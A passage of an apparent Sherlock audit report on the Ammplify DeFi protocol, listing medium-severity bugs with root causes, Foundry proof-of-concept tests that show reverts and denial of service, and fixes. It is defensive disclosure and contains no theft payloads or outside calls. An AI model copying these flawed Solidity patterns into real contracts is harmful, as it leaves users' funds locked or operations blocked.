base contract of AdminFacet.\r\n\r\nThis prevents the ownership handover process from completing as intended, potentially leaving the contract without an effective admin and blocking any actions that require ownership privileges.\r\n\r\nRoot Cause\r\nIt calls AdminLib.reassignOwner function in acceptOwnership function called by pending owner instead of calling it in transferOwnership function called by current owner.\r\n\r\n/* Owner changes */  \r\n  \r\nfunction transferOwnership(address _newOwner) external virtual override {  \r\n    AdminLib.validateOwner();  \r\n    Timed.memoryPrecommit(OWNER_USE_ID, abi.encode(_newOwner));  \r\n}  \r\n  \r\n/// The pending owner can accept their ownership rights.  \r\nfunction acceptOwnership() external virtual override {  \r\n    bytes memory entry = Timed.fetchPrecommit(OWNER_USE_ID, getDelay(true));  \r\n    address _newOwner = abi.decode(entry, (address));  \r\n    AdminLib.reassignOwner(_newOwner);  \r\n    AdminLib.acceptOwnership();  \r\n    emit IERC173.OwnershipTransferred(AdminLib.getOwner(), msg.sender);  \r\n}  \r\nIn reassignOwner function, it validates owner to check if msg.sender is current owner.\r\n\r\nfunction reassignOwner(address newOwner) internal {  \r\n    validateOwner(); // This is the only validate we do internal to AdminLib because it's so important.  \r\n    adminStore().pendingOwner = newOwner;  \r\n}  \r\n  \r\nfunction validateOwner() internal view {  \r\n    if (msg.sender != adminStore().owner) {  \r\n        revert NotOwner();  \r\n    }  \r\n}  \r\nSo it will be reverted with NotOwner error as the caller of acceptOwnership(msg.sender) is pending owner, not the owner.\r\n\r\nInternal Pre-conditions\r\nAdmin try to transfer ownership to a new owner by calling transferOwnership.\r\nAfter delay(3 days according to codebase), the new owner try to accept ownership by calling acceptOwnership.\r\nExternal Pre-conditions\r\nNone\r\n\r\nAttack Path\r\nAdmin try to transfer ownership to a new owner by calling transferOwnership.\r\nAfter delay(3 days according to codebase), the new owner try to accept ownership by calling acceptOwnership.\r\nImpact\r\nThe pending admin (owner) is unable to accept ownership even after the required delay has elapsed since the current admin’s call to transferOwnership.\r\n\r\nThis prevents the ownership handover process from completing as intended.\r\n\r\nPoC\r\nAdd below test function to Ammplify\\test\\facets\\Admin.t.sol and run forge test --mt testPendingOwnerCannotAcceptOwnership -vvvv in terminal.\r\n\r\nfunction testPendingOwnerCannotAcceptOwnership() public {  \r\n    address pendingOwner = makeAddr(\"pendingOwner\");  \r\n          \r\n    adminFacet.transferOwnership(pendingOwner);  \r\n  \r\n    // Skip the time delay for testing (3 days as per AdminFacet.getDelay implementation)  \r\n    vm.warp(block.timestamp + 3 days);  \r\n          \r\n    vm.startPrank(pendingOwner);  \r\n  \r\n    vm.expectRevert(AdminLib.NotOwner.selector);  \r\n    adminFacet.acceptOwnership();  \r\n  \r\n    vm.stopPrank();  \r\n}  \r\nMitigation\r\nCall AdminLib.reassignOwner in transferOwnership function.\r\n\r\nfunction transferOwnership(address _newOwner) external virtual override {  \r\n    AdminLib.validateOwner();  \r\n    AdminLib.reassignOwner(_newOwner);  // @audit: call it here  \r\n    Timed.memoryPrecommit(OWNER_USE_ID, abi.encode(_newOwner));  \r\n}  \r\n  \r\nfunction acceptOwnership() external virtual override {  \r\n    // @audit: You should leave this as is even though you try to remove below condition check because need to check delay is passed or not  \r\n    bytes memory entry = Timed.fetchPrecommit(OWNER_USE_ID, getDelay(true));  \r\n    address _newOwner = abi.decode(entry, (address));  \r\n    // @audit: Just check if _newOwer is msg.sender. You can skip this check because AdminLib.acceptOwnership checks it  \r\n    if (_newOwner != msg.sender) {  \r\n        revert AdminLib.ImproperOwnershipAcceptance();  \r\n    }  \r\n    AdminLib.acceptOwnership();  \r\n    emit IERC173.OwnershipTransferred(AdminLib.getOwner(), msg.sender);  \r\n}  \r\nIssue M-7: X/Y mix-up in ViewWalker.down will underreport X fees and block taker closes\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/249\r\n\r\nFound by\r\nDSbeX, JeRRy0422, Slayer, TheSavageTeddy, Ziusz, blockace, coin2own, jayjoshix, maigadoh, rubencrxz, serenity1337, v_2110\r\n\r\nSummary\r\nThe X/Y assignment bug in ViewWalker.down will cause an underreporting of token0 (X) taker fees for right-subtree positions, as the view walk writes the right-branch X remainder into a Y field, dropping it from propagation.\r\n\r\nThis makes queryAssetBalances() deviate by well over 0.01% for affected takers, leading users to approve too little token0 and causing removeTaker() settlements to revert.\r\n\r\nRoot Cause\r\nIn ViewWalker.down the X-fee split stores the right-branch remainder into the wrong field:\r\n\r\n// X split  \r\ndata.leftChildUnpaidX  = leftPaid;  \r\ndata.rightChildUnpaidY = unpaidX - leftPaid; // should be rightChildUnpaidX  \r\nFix:\r\n\r\n- data.rightChildUnpaidY = unpaidX - leftPaid;  \r\n+ data.rightChildUnpaidX = unpaidX - leftPaid;  \r\nThis typo nukes the right branch’s inherited X taker-fees; later reads use rightChildUnpaidX, which was never written for this branch.\r\n\r\nInternal Pre-conditions\r\nThere exists a node on the route whose node.fees.unpaidTakerXFees > 0 (fees to be propagated).\r\n\r\nA taker asset’s visited node lies in that node’s right subtree with aNode.sliq > 0.\r\n\r\nThe user (or frontend/automation) calls ViewFacet.queryAssetBalances(assetId) to size approvals based on fees0.\r\n\r\nThe user then attempts to close via TakerFacet.removeTaker(...), which internally settles via RFTLib.settle(...).\r\n\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nA taker with a right-subtree position accrues X-fees upstream (unpaidTakerXFees > 0).\r\n\r\nUser/automation queries queryAssetBalances(assetId). Due to the mix-up, fees0 (X) is underreported (potentially by almost the entire right-branch share), exceeding the 0.01% threshold.\r\n\r\nUser approves token0 equal to the underreported fees0.\r\n\r\nUser calls removeTaker(...). During RFTLib.settle, the contract tries to pull the true X owed (greater than approved), causing transferFrom to fail and the transaction to revert—blocking the close until the user increases approval.\r\n\r\nImpact\r\nThe user cannot close taker positions (DoS) unless they over-approve or trial-and-error approvals. Gas is wasted on reverting txs. Deviation in queryAssetBalances() can be >>0.01% (up to nearly all X fees attributable to the right branch), satisfying the contest’s “Additional audit information”.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nApply the one-line fix shown above.\r\n\r\nAdd symmetry tests asserting that after an X/Y split at a non-leaf:\r\n\r\nX: leftChildUnpaidX + rightChildUnpaidX == unpaidX\r\n\r\nY: leftChildUnpaidY + rightChildUnpaidY == unpaidY\r\n\r\nSimilar checks for Unclaimed maker fields.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/23\r\n\r\nIssue M-8: Can't remove compounding maker asset if any visit node in route has only liquidity for it\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/260\r\n\r\nFound by\r\n0xnija, KlosMitSoss, SOPROBRO, holtzzx, neeloy, panprog, v_2110\r\n\r\nSummary\r\nWhen remove a maker asset, it walking through route and remove liquidity for that maker asset in each relevant node.\r\n\r\nBut because of wrong usage of FullMath.mulDivX256 in LiqWalker.modify function, it can't remove the maker asset if any visit node(means that the node reaching LiqWalker.modify function) only has liquidity for that asset.\r\n\r\nSo the owner of that asset can't remove it until all of visit nodes have more liquidty than it's own.\r\n\r\nThis restriction may temporarily lock user funds for an indeterminate period when they want to remove the asset, reducing flexibility and introducing potential usability and liquidity risks.\r\n\r\nRoot Cause\r\nIn LiqWalker.modify function, it calculates shareRatioX256 using FullMath.mulDivX256 function for compounding maker's nodes when currentLiq > targetLiq.\r\n\r\nuint128 sliq = aNode.sliq; // Our current liquidity balance.  \r\nbool dirty = true;  \r\nuint128 targetSliq = targetLiq; // Only changed in the MAKER case  \r\nif (data.liq.liqType == LiqType.MAKER) {  \r\n    uint128 compoundingLiq = 0;  \r\n    uint128 currentLiq = 0;  \r\n    targetSliq = targetLiq; // Shares start equal to liq.  \r\n    if (node.liq.shares != 0) {  \r\n        ...  \r\n        compoundingLiq = node.liq.mLiq - node.liq.ncLiq + equivLiq;  \r\n        currentLiq = uint128(FullMath.mulDiv(compoundingLiq, sliq, node.liq.shares));  \r\n        // The shares we'll have afterwards.  \r\n        targetSliq = uint128(FullMath.mulDiv(node.liq.shares, targetLiq, compoundingLiq));  \r\n    }  \r\n    if (currentLiq < targetLiq) {  \r\n        ...  \r\n    } else if (currentLiq > targetLiq) {  \r\n        // When subtracting liquidity, since we've already considered the equiv liq in adding,  \r\n        // we can just remove the share-proportion of liq and fees (not equiv).  \r\n        compoundingLiq = node.liq.mLiq - node.liq.ncLiq;  \r\n        uint128 sliqDiff = sliq - targetSliq;  \r\n        uint256 shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);  \r\n        uint128 liq = uint128(FullMath.mulX256(compoundingLiq, shareRatioX256, false));  \r\n        node.liq.mLiq -= liq;  \r\n        node.liq.shares -= sliqDiff;  \r\n        node.liq.subtreeMLiq -= iter.width * liq;  \r\n        uint256 xClaim = FullMath.mulX256(node.fees.xCFees, shareRatioX256, false);  \r\n        node.fees.xCFees -= uint128(xClaim);  \r\n        data.xBalance -= int256(xClaim);  \r\n        uint256 yClaim = FullMath.mulX256(node.fees.yCFees, shareRatioX256, false);  \r\n        node.fees.yCFees -= uint128(yClaim);  \r\n        data.yBalance -= int256(yClaim);  \r\n        // Now we claim the balances from the liquidity itself.  \r\n        (uint256 xOwed, uint256 yOwed) = data.computeBalances(iter.key, liq, false);  \r\n        data.xBalance -= int256(xOwed);  \r\n        data.yBalance -= int256(yOwed);  \r\n    } else {  \r\n        dirty = false;  \r\n    }  \r\n}  \r\nWhen owner of the compounding maker asset try to remove it, it definitely matchs in the above conditions(data.liq.liqType == LiqType.MAKER and currentLiq > targetLiq as targetLiq = 0).\r\n\r\nAs targetLiq=0, targetSliq is being calculated as 0.\r\n\r\nSo in this case, sliqDiff = sliq - targetSliq = sliq - 0 = sliq = aNode.sliq.\r\n\r\nOn the other hand, FullMath.mulDivX256 function requires denominator > num and if this condition isn't meet, it reverts.\r\n\r\nrequire(denominator > num, \"0\");  \r\nIf the processing node only contains the liquidity for this asset, aNode.sliq = node.liq.shares and because of that, it will revert when try to call FullMath.mulDivX256 function for shareRatioX256 calcuation.\r\n\r\nInternal Pre-conditions\r\nAny visit node of the route(means that the node reaching out to LiqWalker.modify function) only contains liquidity for the compounding maker asset being removed.\r\n\r\nExternal Pre-conditions\r\nNone\r\n\r\nAttack Path\r\nOwner of a compounding maker asset that meets the internal pre-condition try to remove the asset.\r\n\r\nImpact\r\nUsers may be unable to withdraw their compounding maker assets on demand if the asset is in certain liquidity conditions.\r\n\r\nSpecifically, withdrawals can only succeed once all relevant nodes contain more liquidity than the removing asset's own liquidity within them.\r\n\r\nThis restriction may temporarily lock user funds for an indeterminate period when they want to remove the asset, reducing flexibility and introducing potential usability and liquidity risks.\r\n\r\nPoC\r\nAdd below test function to Ammplify\\test\\facets\\Maker.t.sol and run forge test --mt testRemoveMakerForCompoundingNotWorkingProperly -vvvv in terminal.\r\n\r\nfunction testRemoveMakerForCompoundingNotWorkingProperly() public {  \r\n    // First create a maker position  \r\n    bytes memory rftData = \"\";  \r\n    uint256 assetId = makerFacet.newMaker(  \r\n        recipient,  \r\n        poolAddr,  \r\n        lowTick,  \r\n        highTick,  \r\n        liquidity,  \r\n        true, // Compounding maker  \r\n        minSqrtPriceX96,  \r\n        maxSqrtPriceX96,  \r\n        rftData  \r\n    );  \r\n  \r\n    // Mock the asset owner  \r\n    vm.prank(recipient);  \r\n  \r\n    // Remove the maker position  \r\n    vm.expectRevert();  \r\n    makerFacet.removeMaker(  \r\n        recipient,  \r\n        assetId,  \r\n        uint128(minSqrtPriceX96),  \r\n        uint128(maxSqrtPriceX96),  \r\n        rftData  \r\n    );  \r\n}  \r\nMitigation\r\nDon't call FullMath.mulDivX256 function when sliqDiff == node.liq.shares.\r\n\r\nRemove below line of the function\r\n\r\nuint256 shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);  \r\nAnd add below code snippet\r\n\r\nuint256 shareRatioX256;  \r\nif (sliqDiff == node.liq.shares) {  \r\n    shareRatioX256 = type(uint256).max;  \r\n} else {  \r\n    shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);  \r\n}  \r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/39\r\n\r\nIssue M-9: Unchecked Underflow in TreeTickLib Causes Transaction Revert in Route Creation\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/261\r\n\r\nFound by\r\n0xapple, Edoscoba, TheSavageTeddy\r\n\r\nSummary\r\nUnchecked arithmetic underflow in TreeTickLib.sol causes a transaction revert for users attempting to modify pool positions, as the system generates an invalid tree index that triggers a failure in the RouteImpl.make function's range validation.\r\n\r\nRoot Cause\r\nIn TreeTickLib.sol within the tickToTreeIndex function, the calculation uint24(tick / tickSpacing) + rootWidth / 2 is performed inside an unchecked block. When tick / tickSpacing is sufficiently negative (e.g., less than -rootWidth / 2), the cast uint24(tick / tickSpacing) converts the negative result to a large positive value due to underflow (e.g., -524,289 becomes 16,252,927). Adding rootWidth / 2 to this does not cause another underflow but rather produces an incorrect tree index (e.g., 16,515,071), which propagates through the system, leading to a revert in downstream logic.\r\n\r\nfunction tickToTreeIndex(int24 tick, uint24 rootWidth, int24 tickSpacing) internal pure returns (uint24) {  \r\n    unchecked {  \r\n        require(tick % tickSpacing == 0, UnalignedTick(tick, tickSpacing));  \r\n        return uint24(tick / tickSpacing) + rootWidth / 2; // Underflow occurs here if result is negative  \r\n    }  \r\n}  \r\nInternal Pre-conditions\r\nNone\r\n\r\nExternal Pre-conditions\r\nNone\r\n\r\nAttack Path\r\nA user initiates a pool position update by calling WalkerLib.modify with a valid negative lowTick (e.g., -524,289), a valid highTick (e.g., -200,000), tickSpacing = 1, and rootWidth = 524,288 (as computed by calcRootWidth).\r\n\r\nfunction modify(PoolInfo memory pInfo, int24 lowTick, int24 highTick, Data memory data) internal {  \r\n    uint24 low = pInfo.treeTick(lowTick); // Calls treeTick with lowTick  \r\n    uint24 high = pInfo.treeTick(highTick) - 1; // Calls treeTick with highTick  \r\n    Route memory route = RouteImpl.make(pInfo.treeWidth, low, high);  \r\n    route.walk(down, up, phase, toRaw(data));  \r\n}  \r\nThe modify function calls PoolInfoImpl.treeTick for both ticks, which invokes TreeTickLib.tickToTreeIndex to convert each tick to a uint24 tree index.\r\n\r\nfunction treeTick(PoolInfo memory self, int24 tick) internal pure returns (uint24) {  \r\n    return TreeTickLib.tickToTreeIndex(tick, self.treeWidth, self.tickSpacing);  \r\n}  \r\nFor lowTick = -524,289, tickToTreeIndex computes tick / tickSpacing = -524,289 / 1 = -524,289. The cast uint24(-524,289) underflows to 2^24 - 524,289 = 16,252,927. Adding rootWidth / 2 = 524,288 / 2 = 262,144 yields 16,252,927 + 262,144 = 16,515,071.\r\n\r\nFor highTick = -200,000, tickToTreeIndex computes tick / tickSpacing = -200,000 / 1 = -200,000. The cast uint24(-200,000) underflows to 2^24 - 200,000 = 16,577,216. Adding rootWidth / 2 = 524,288 / 2 = 262,144 yields 16,577,216 + 262,144 = 16,839,360. As this value is bigger than uint24 can fit it yields 62,144\r\n\r\nThe modify function passes these indices to RouteImpl.make(pInfo.treeWidth, low, high), where low = 16,515,071 and high = 224,288. The make function checks _right < _left:\r\n\r\nfunction make(uint24 _rootWidth, uint24 _left, uint24 _right) internal pure returns (Route memory) {  \r\n    if (_right < _left) revert InvertedRange(_left, _right); // Reverts here  \r\n}  \r\nSince 224,288 < 16,515,071, the transaction reverts with an InvertedRange error.\r\n\r\nImpact\r\nUsers cannot successfully execute the modify function to update pool positions, as the transaction reverts due to the invalid tree index causing a range validation failure in RouteImpl.make. This prevents users from performing intended operations on the pool, such as adding liquidity positions. This effectively disables the core functionality of the protocol.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nNo response\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/25\r\n\r\nIssue M-10: incompatible library used for Fee on Transfer tokens\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/315\r\n\r\nThis issue has been acknowledged by the team but won't be fixed at this time.\r\n\r\nFound by\r\nCasinoCompiler, VCeb, glitch-Hunter, tedox\r\n\r\nSummary\r\nFrom the competition details:\r\n\r\nHowever, we are not expected to have issues with:\r\n...\r\nTransfer of less than amount\r\n...\r\nThe traits listed above are in scope and the contracts are expected to work correctly with them.\r\n\r\nHowever, the protocol adopts the RFT library which is incompatible with tokens that have a fee on transfer.\r\n\r\nRoot Cause\r\nThe competition details explicitly states that \"Transfer of less than amount\" tokens are expected to work correctly but the protocol handles token transfers through an external library, RFTLib, for all its operations.\r\n\r\nThe issue is this library does not support Fee on Transfer tokens as their is a strict validation check within it:\r\n\r\n        actualDeltas = new int256[](tokens.length);  \r\n        for (uint256 i = 0; i < tokens.length; ++i) {  \r\n            address token = tokens[i];  \r\n  \r\n            // Validate our balances.  \r\n            uint256 finalBalance = IERC20(token).balanceOf(address(this));  \r\n            actualDeltas[i] = U256Ops.sub(finalBalance, startBalances[i]);  \r\n            if (actualDeltas[i] < balanceChanges[i]) {  \r\n                revert InsufficientReceive(token, balanceChanges[i], actualDeltas[i]);  \r\n            }  \r\nWhen the library tries to transfer the tokens, the actual deltas will always be less than balanceChanges therefore the protocol will always revert for any fee on transfer token.\r\n\r\nInternal Pre-conditions\r\nUser needs to attempt creating a position with a fee-on-transfer token\r\nExternal Pre-conditions\r\nN/A\r\n\r\nAttack Path\r\nUser holds fee-on-transfer tokens that the protocol explicitly claims to support.\r\nUser attempts to create a maker position by calling newMaker() or similar functions\r\nProtocol attempts to transfer tokens through RFTLib.settle()\r\nFee-on-transfer token deducts transfer fee e.g. 2% of transfer amount\r\nProtocol receives less tokens than expected due to fee deduction\r\nRFTLib validation fails with InsufficientReceive error, reverting the transaction\r\nUser cannot create any positions with fee-on-transfer tokens despite protocol's compatibility claims\r\nImpact\r\nDenial of service for any token that has a fee on transfer, a capability that should be possible based on the competition details.\r\n\r\nDoS is medium severity according to Sherlock validity criterua\r\n\r\nPoC\r\nSufficient evidence given in Root cause, PoC can be provided upon request.\r\nMitigation\r\nImplement proper fee-on-transfer token handling in the settlement system or use a different library.\r\n\r\nalternatively, do not allow fee on transfer tokens in the protocol.\r\n\r\nIssue M-11: Wide cross-zero ranges revert (InvertedRange) due to sign-loss in tick→index and no wrap support\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/336\r\n\r\nFound by\r\n0xpinkman, anonymousjoe, iam0ti, vtim, web3made\r\n\r\nSummary\r\nTreeTickLib.tickToTreeIndex casts int→uint24 before adding the offset and never applies % rootWidth. RouteImpl.make reverts whenever _right < _left and does not accept wrapped intervals. For wide cross-zero ranges (e.g., [-k, +k] with k > rootWidth/2 * tickSpacing), left > right occurs and route construction reverts. Normal cross-zero bands succeed; the failure starts exactly at the threshold.\r\n\r\nRoot Cause\r\nSign lost + no normalization in TreeTickLib.tickToTreeIndex\r\n\r\nreturn uint24(tick / tickSpacing) + rootWidth / 2; // cast-before-offset; no % rootWidth  \r\nNo wrap-around acceptance in RouteImpl.make\r\n\r\nfunction make(uint24 _rootWidth, uint24 _left, uint24 _right) internal pure returns (Route memory) {  \r\n        if (_right < _left) revert InvertedRange(_left, _right);  \r\nThe WalkerLib.modify builds the route without splitting wrapped spans\r\n\r\nIn Lib.sol\r\nInternal Pre-conditions\r\nUser (taker/maker) chooses a cross-zero range [-k, +k] where k > (rootWidth/2) * tickSpacing.\r\nA walker path is invoked (e.g., WalkerLib.modify) to build a route from the mapped indices.\r\nExternal Pre-conditions\r\nNone required, pure index/route logic.\r\n\r\nAttack Path\r\nUser calls a flow that computes route for [-k, +k] (wide cross-zero).\r\nTreeTickLib.tickToTreeIndex maps ticks so that leftIndex > rightIndex-1.\r\nRoute construction RouteImpl.make(rootWidth, left, right) sees _right < _left and reverts InvertedRange.\r\nThe walker bubbles the revert; the operation cannot proceed.\r\nImpact\r\nOperational DoS of legitimate “very wide” cross-zero ranges: attempts to open/modify/close such ranges revert at route construction.\r\nThis includes near-full-range on Uniswap v3–style pools when tickSpacing=60, because rootWidth (power-of-two) is < full tick domain, so |tick/spacing| > rootWidth/2 is reachable.\r\nNo direct fund loss; it blocks user actions unless the caller manually splits the interval.\r\nPoC\r\n// SPDX-License-Identifier: BUSL-1.1  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { Test } from \"forge-std/Test.sol\";  \r\nimport { TickMath } from \"v4-core/libraries/TickMath.sol\";  \r\nimport { TreeTickLib } from \"src/tree/Tick.sol\";  \r\nimport { Route, RouteImpl } from \"src/tree/Route.sol\";  \r\n  \r\ncontract RouteInvoker {  \r\n    function make(uint24 rootWidth, uint24 left, uint24 right) external pure returns (Route memory) {  \r\n        return RouteImpl.make(rootWidth, left, right);  \r\n    }  \r\n}  \r\n  \r\nerror InvertedRange(uint24 left, uint24 right);  \r\n  \r\ncontract PoC_Tree_CrossZero is Test {  \r\n    int24 constant TICK_SPACING = 60;  \r\n  \r\n    RouteInvoker internal invoker;  \r\n  \r\n    struct CaseResult {  \r\n        int24 lowTick;  \r\n        int24 highTick;  \r\n        uint24 rootWidth;  \r\n        uint24 lowIndex;  \r\n        uint24 highIndexMinus1;  \r\n        bool lowGreaterThanHigh;  \r\n        bool routeReverted;  \r\n        bytes revertData;  \r\n    }  \r\n  \r\n    function setUp() public {  \r\n        invoker = new RouteInvoker();  \r\n    }  \r\n  \r\n    function _normalize(uint24 idx, uint24 rootWidth) internal pure returns (uint24) {  \r\n        return idx % rootWidth;  \r\n    }  \r\n  \r\n    /// @dev boundary (k = rootWidth/2 * spacing) succeeds; boundary+1 inverts & reverts.  \r\n    function test_crossZeroBoundary_thresholds() public {  \r\n        uint24 rootWidth = TreeTickLib.calcRootWidth(TickMath.MIN_TICK, TickMath.MAX_TICK, TICK_SPACING);  \r\n        uint24 half = rootWidth / 2;  \r\n  \r\n        // boundary = half*spacing  → should NOT invert (wrap lands inside [0,rootWidth))  \r\n        int24 k0 = int24(int256(uint256(half))) * TICK_SPACING;  \r\n        CaseResult memory c0 = _runCase(rootWidth, -k0, k0);  \r\n        assertFalse(c0.lowGreaterThanHigh, \"boundary case must not invert\");  \r\n        assertFalse(c0.routeReverted, \"Route.make must succeed at boundary\");  \r\n  \r\n        // boundary+1 → inversion: lowIndex > highIndexMinus1, Route.make reverts InvertedRange  \r\n        int24 k1 = int24(int256(uint256(half + 1))) * TICK_SPACING;  \r\n        CaseResult memory c1 = _runCase(rootWidth, -k1, k1);  \r\n        assertTrue(c1.lowGreaterThanHigh, \"boundary+1 must invert\");  \r\n        assertTrue(c1.routeReverted, \"Route.make must revert (InvertedRange) at boundary+1\");  \r\n    }  \r\n  \r\n    /// @dev raw route reverts, but splitting into two wrapped routes ([left..rootWidth-1] and [0..right]) both succeed.  \r\n    function test_wrappedNormalization_succeeds() public {  \r\n        uint24 rootWidth = TreeTickLib.calcRootWidth(TickMath.MIN_TICK, TickMath.MAX_TICK, TICK_SPACING);  \r\n        uint24 half = rootWidth / 2;  \r\n        int24 k1 = int24(int256(uint256(half + 1))) * TICK_SPACING;  \r\n  \r\n        // Raw indices (as used today) → invert & revert  \r\n        CaseResult memory rawCase = _runCase(rootWidth, -k1, k1);  \r\n        assertTrue(rawCase.lowGreaterThanHigh && rawCase.routeReverted, \"raw must invert & revert\");  \r\n  \r\n        // Normalized indices (wrap-aware): split into two segments if left > right  \r\n        uint24 leftNorm = rawCase.lowIndex % rootWidth;  \r\n        uint24 rightNormMinus1 = rawCase.highIndexMinus1 % rootWidth;  \r\n  \r\n        if (leftNorm <= rightNormMinus1) {  \r\n            // no wrap; single route must succeed  \r\n            (bool ok, ) = _callMake(rootWidth, leftNorm, rightNormMinus1);  \r\n            assertTrue(ok, \"single normalized route should succeed\");  \r\n        } else {  \r\n            // wrap; two routes must each succeed  \r\n            (bool ok1, ) = _callMake(rootWidth, leftNorm, rootWidth - 1);  \r\n            (bool ok2, ) = _callMake(rootWidth, 0, rightNormMinus1);  \r\n            assertTrue(ok1 && ok2, \"wrapped normalized routes should both succeed\");  \r\n        }  \r\n    }  \r\n  \r\n    function _callMake(uint24 rootWidth, uint24 left, uint24 right) internal returns (bool ok, bytes memory data) {  \r\n        (ok, data) = address(invoker).call(abi.encodeWithSelector(RouteInvoker.make.selector, rootWidth, left, right));  \r\n    }  \r\n  \r\n    function _runCase(  \r\n        uint24 rootWidth,  \r\n        int24 lowTick,  \r\n        int24 highTick  \r\n    ) internal view returns (CaseResult memory result) {  \r\n        result.lowTick = lowTick;  \r\n        result.highTick = highTick;  \r\n        result.rootWidth = rootWidth;  \r\n  \r\n        uint24 lowIndex = TreeTickLib.tickToTreeIndex(lowTick, rootWidth, TICK_SPACING);  \r\n        uint24 highIndex = TreeTickLib.tickToTreeIndex(highTick, rootWidth, TICK_SPACING);  \r\n        uint24 highMinusOne = highIndex - 1;  \r\n  \r\n        result.lowIndex = lowIndex;  \r\n        result.highIndexMinus1 = highMinusOne;  \r\n        result.lowGreaterThanHigh = lowIndex > highMinusOne;  \r\n  \r\n        try invoker.make(rootWidth, lowIndex, highMinusOne) returns (Route memory) {  \r\n            result.routeReverted = false;  \r\n        } catch (bytes memory revertData) {  \r\n            result.routeReverted = true;  \r\n            result.revertData = revertData;  \r\n        }  \r\n    }  \r\n}  \r\nMitigation\r\nNormalize indices after applying the signed offset (e.g., (q + rootWidth/2) % rootWidth) or accept wrap in RouteImpl.make or split wrapped spans in WalkerLib.modify before calling RouteImpl.make.\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/25\r\n\r\nIssue M-12: View::queryAssetBalances does not account for JIT penalties\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/349\r\n\r\nFound by\r\ntedox\r\n\r\nSummary\r\nView::queryAssetBalances is used to query how much assets an user would receive if they were to withdraw their funds at the moment. However, the value returned will be wrong as it does not account for potential JIT penalties that the position might incur.\r\n\r\nRoot Cause\r\nWhen a user removes their maker position it calculates the amount of assets to return and then applies a JIT penalty if needed afterwards.\r\n\r\ncode\r\n\r\n    /// @inheritdoc IMaker  \r\n    function removeMaker(  \r\n        address recipient,  \r\n        uint256 assetId,  \r\n        uint160 minSqrtPriceX96,  \r\n        uint160 maxSqrtPriceX96,  \r\n        bytes calldata rftData  \r\n    ) external nonReentrant returns (address token0, address token1, uint256 removedX, uint256 removedY) {  \r\n        Asset storage asset = AssetLib.getAsset(assetId);  \r\n        require(asset.owner == msg.sender, NotMakerOwner(asset.owner, msg.sender));  \r\n        require(asset.liqType == LiqType.MAKER || asset.liqType == LiqType.MAKER_NC, NotMaker(assetId));  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(asset.poolAddr);  \r\n        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, 0);  \r\n        WalkerLib.modify(pInfo, asset.lowTick, asset.highTick, data);  \r\n        // Settle balances.  \r\n        PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n        removedX = uint256(-data.xBalance); // These are definitely negative.  \r\n        removedY = uint256(-data.yBalance);  \r\n->      (removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  //@audit JIT penalty applied to the full amount returned  \r\n        AssetLib.removeAsset(assetId);  \r\n        address[] memory tokens = pInfo.tokens();  \r\n        int256[] memory balances = new int256[](2);  \r\n        balances[0] = -int256(removedX); // We know they fit since they can only be less (in magnitude) than before.  \r\n        balances[1] = -int256(removedY);  \r\n        RFTLib.settle(recipient, tokens, balances, rftData);  \r\n        // Return values  \r\n        token0 = tokens[0];  \r\n        token1 = tokens[1];  \r\n    }  \r\nHowever, when the view function is used it does not properly account for the JIT penalty.\r\n\r\ncode\r\n\r\n    /// Compute the token balances owned/owed by the position.  \r\n    /// @dev We separate the fee and liq balance so we can use the same method for fee earnings and total value.  \r\n    /// @return netBalance0 The amount of token0 owed to the position owner sans fees (Negative is owed by the owner).  \r\n    /// @return netBalance1 The amount of token1 owed to the position owner sans fees (Negative is owed by the owner).  \r\n    /// @return fees0 The amount of fees in token0 owed to a maker or owed by a taker depending on the liq type.  \r\n    /// @return fees1 The amount of fees in token1 owed to a maker or owed by a taker depending on the liq type.  \r\n    function queryAssetBalances(  \r\n        uint256 assetId  \r\n    ) external view returns (int256 netBalance0, int256 netBalance1, uint256 fees0, uint256 fees1) {  \r\n        Asset storage asset = AssetLib.getAsset(assetId);  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(asset.poolAddr);  \r\n        ViewData memory data = ViewDataImpl.make(pInfo, asset);  \r\n        ViewWalkerLib.viewAsset(pInfo, asset.lowTick, asset.highTick, data);  \r\n        if (asset.liqType == LiqType.TAKER) {  \r\n            uint256 vaultX = VaultLib.balanceOf(pInfo.token0, asset.xVaultIndex, assetId, false);  \r\n            uint256 vaultY = VaultLib.balanceOf(pInfo.token1, asset.yVaultIndex, assetId, false);  \r\n            // Balance and fees are owed, and vault balance is owned.  \r\n            netBalance0 = int256(vaultX) - int256(data.liqBalanceX);  \r\n            netBalance1 = int256(vaultY) - int256(data.liqBalanceY);  \r\n            fees0 = data.earningsX;  \r\n            fees1 = data.earningsY;  \r\n        } else {                                                              //@audit missing JIT penalty  \r\n            netBalance0 = int256(data.liqBalanceX);  \r\n            netBalance1 = int256(data.liqBalanceY);  \r\n            fees0 = data.earningsX;  \r\n            fees1 = data.earningsY;  \r\n        }  \r\n    }  \r\nThis would cause a mismatch between the 2 values of more than 0.01% as long as the JIT penalty is 